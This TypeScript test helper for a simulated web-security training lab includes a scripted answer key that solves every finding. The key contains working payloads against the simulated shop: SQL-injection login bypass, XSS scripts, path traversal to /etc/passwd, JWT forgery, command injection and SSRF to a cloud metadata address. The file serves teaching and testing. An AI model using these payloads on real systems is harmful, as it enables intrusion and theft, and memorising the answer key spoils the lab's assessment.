import { webLab as E } from '../server/engine';
import { FINDINGS } from '../server/scenario';
import { createApp } from '../server/app';
import type { IdentityResolver } from '../server/identity';
import type { Store } from '../server/store';

export { E, FINDINGS };

export class Lab {
  state = E.createInitialState(); last: any;
  do(type: string, params: any = {}) { const r = E.dispatch(this.state, { type, params }); this.state = r.state; this.last = r.result; return r.result; }
  ok(type: string, params: any = {}) { const r = this.do(type, params); if (!r.ok) throw new Error(`${type} failed: ${r.code} ${r.message}`); return r; }
  get status() { return E.status(this.state); }
  get view() { return E.view(this.state); }
  finding(id: string) { return this.status.findings.find((f: any) => f.id === id); }
  obj(id: string) { return this.status.objectives.find((o: any) => o.id === id); }
  nav(url: string, method = 'GET', body?: string) { return this.ok('browser.navigate', { url, method, body }); }
  send(request: any) { return this.ok('proxy.send', { request }); }
  term(line: string) { return this.ok('terminal.exec', { line }); }
}

/** Full scripted solution — used only in tests as an answer key proving every finding is reachable. */
export const solve = {
  recon(l: Lab) {
    l.ok('engagement.acknowledge');
    for (const u of ['/', '/products', '/robots.txt', '/search', '/login', '/product?id=101', '/sitemap.xml']) l.nav(u);
    l.nav('/api/order?id=5001');  // 401, but records the API surface
    l.nav('/admin');              // 403, but records the admin surface
  },
  exploit(l: Lab) {
    // V-SQLI: auth bypass via Repeater
    l.send({ method: 'POST', path: '/login', headers: { 'content-type': 'application/x-www-form-urlencoded' }, body: "username=admin'--&password=x" });
    // V-RXSS: reflected XSS in search
    l.nav('/search?q=<script>alert(document.domain)</script>');
    // V-SXSS: stored XSS via a ticket
    l.nav('/support/ticket', 'POST', 'subject=hi&body=<script>alert(1)</script>');
    const ticketId = l.state.target.nextTicketId - 1;
    l.nav(`/support/ticket?id=${ticketId}`);
    // Log in (bypass) in the browser so the cookie jar carries a session for the IDOR step
    l.nav('/login', 'POST', "username=admin'--&password=x");
    // V-IDOR: read another customer's order
    l.nav('/api/order?id=5001');
    // V-FILE: sensitive file exposure
    l.nav('/download?file=backups/novacart-db.sql.bak');
    // V-TRAVERSAL: path traversal
    l.nav('/download?file=../../../../etc/passwd');
    // V-JWT: forge an admin token with the (leaked) weak secret, set it, enter admin
    const secret = l.state.target.jwtSecret;
    const token = l.term(`jwt sign ${secret} {"user":"admin","role":"admin"}`).result.output.trim();
    l.ok('browser.setCookie', { name: 'nc_admin', value: token });
    l.nav('/admin');
    // V-CMD: command injection in the admin host check
    l.nav('/admin/ping?host=127.0.0.1;id');
    // V-SSRF: reach the internal metadata service
    l.nav('/admin/fetch?url=http://169.254.169.254/');
  },
  document(l: Lab) {
    for (const f of FINDINGS) l.ok('finding.report', { findingId: f.id, severity: f.severity });
    // attach some evidence
    const hist = l.view.history;
    for (const h of hist.slice(0, 4)) l.ok('evidence.add', { historyId: h.id });
  },
  remediate(l: Lab) {
    for (const f of FINDINGS) {
      const correct = f.options.find(o => o.correct)!.id;
      l.ok('finding.remediate', { findingId: f.id, optionId: correct });
      l.ok('finding.retest', { findingId: f.id });
    }
  },
  report(l: Lab) {
    l.ok('report.submit', { summary: 'NovaCart exposes nine exploitable web vulnerabilities spanning injection, broken access control, authentication and SSRF. All were confirmed, remediated and verified during this engagement.' });
  },
  all(l: Lab) { solve.recon(l); solve.exploit(l); solve.document(l); solve.remediate(l); solve.report(l); },
};

/* ---------------- API test harness ---------------- */
export const ORIGIN = 'http://localhost:5180';
/** Stand-in identity: cookie `test_user=<name>` is a signed-in learner. */
export const fakeIdentity: IdentityResolver = async (h) => {
  const m = /(?:^|;\s*)test_user=([^;]+)/.exec(h.cookie || '');
  if (!m) return { ok: false, reason: 'signed-out', setCookies: [] };
  const name = decodeURIComponent(m[1]);
  if (name === 'down') return { ok: false, reason: 'unavailable' };
  return { ok: true, user: { id: `u_${name.toLowerCase()}`, name, email: null, image: null, isTrial: name.startsWith('trial'), isAdmin: false }, setCookies: [] };
};
export const makeApp = (store: Store, staticDir?: string, appOrigin = ORIGIN) =>
  createApp(store, staticDir, { identity: fakeIdentity, appOrigin, devLogin: false });
export const auth = (name: string) => ({ Cookie: `test_user=${encodeURIComponent(name)}`, Origin: ORIGIN });
